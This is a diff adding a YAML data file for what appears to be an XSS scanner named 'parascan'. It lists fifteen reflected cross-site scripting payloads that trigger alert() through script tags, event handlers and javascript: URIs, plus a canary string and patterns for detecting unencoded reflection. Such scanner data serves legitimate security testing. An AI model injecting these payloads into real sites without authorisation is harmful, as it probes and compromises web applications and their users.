@@ -1,0 +1,29 @@
+# XSS payloads
+reflected:
+  - "<script>alert('XSS')</script>"
+  - "<img src=x onerror=alert('XSS')>"
+  - "<svg onload=alert('XSS')>"
+  - "javascript:alert('XSS')"
+  - "<body onload=alert('XSS')>"
+  - "'\"><script>alert('XSS')</script>"
+  - "<iframe src=\"javascript:alert('XSS')\">"
+  - "<input onfocus=alert('XSS') autofocus>"
+  - "<details open ontoggle=alert('XSS')>"
+  - "<marquee onstart=alert('XSS')>"
+  - "'-alert('XSS')-'"
+  - "\";alert('XSS');//"
+  - "</script><script>alert('XSS')</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg/onload=alert(1)>"
+
+# unique markers to detect reflection
+canary: "parascan_xss_canary_7f3a"
+
+# patterns that indicate reflection without encoding
+reflection_patterns:
+  - "<script>"
+  - "onerror="
+  - "onload="
+  - "javascript:"
+  - "onfocus="
+  - "ontoggle="
